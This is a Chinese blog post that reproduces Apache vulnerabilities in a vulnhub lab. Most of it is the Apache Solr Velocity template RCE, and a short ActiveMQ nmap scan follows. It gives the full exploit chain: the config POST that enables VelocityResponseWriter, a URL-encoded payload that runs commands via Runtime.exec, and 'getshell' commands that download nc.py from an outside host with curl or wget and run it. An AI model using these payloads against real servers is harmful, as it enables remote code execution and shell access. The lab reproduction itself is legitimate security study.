---
layout: post
toc: true
title: "「vulnhub」:Apace-RCE漏洞复现总结"
date: 2020-08-22
author: Bin4xin
categories:
    - blog
    - 笔记
    - vulnhub
    - CVE
    - 漏洞复现
permalink: /blog/2020/Apache/vuln-Cve/
---


## Apache-solr-vuln
```bash
curl "http://192.168.137.181:8983/solr/admin/cores?indexInfo=false&wt=json"

{
  "responseHeader":{
    "status":0,
    "QTime":0},
  "initFailures":{},
  "status":{
    "demo":{
      "name":"demo",
      "instanceDir":"/var/solr/data/demo",
      "dataDir":"/var/solr/data/demo/data/",
      "config":"solrconfig.xml",
      "schema":"managed-schema",
      "startTime":"2020-08-22T01:42:03.422Z",
      "uptime":51628
          }
    }
}
```
关键是这个`deomo:namel;instanceDir...`，修改数据包`Content-Type: application/json`，post数据修改内容：

```bash
POST /solr/demo/config HTTP/1.1
Host: 192.168.137.181:8983
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 259

{
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}
/////////////////////////////////////////////////////////////////////////////////////

反包：
HTTP/1.1 200 OK
Connection: close
Content-Type: text/plain;charset=utf-8
Content-Length: 149

{
  "responseHeader":{
    "status":0,
    "QTime":425},
  "WARNING":"This response format is experimental.  It is likely to change in the future."}
```
rce payload:
```bash
solr/bin4xin/select?wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27pwd%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end
```

getshell:
```bash
$rt.getRuntime().exec(%27curl%20-o%20/tmp/nc.py%20http://www.chihou.pro:8000/nc.py%27)


wget%20-o%20/tmp/nc.py%20http://www.chihou.pro:8000/nc.py

$rt.getRuntime().exec(%27python%20/tmp/nc.py%27)
```
不过一般如果存在基本认证，就需要先过认证才行。

## Apache ActiveMQ-vuln
* 探测

```bash
Nmap scan report for 39.99.161.182
Host is up (0.095s latency).

PORT     STATE SERVICE VERSION
8161/tcp open  http    Jetty 8.1.16.v20140903
|_http-server-header: Jetty(8.1.16.v20140903)
|_http-title: Apache ActiveMQ
```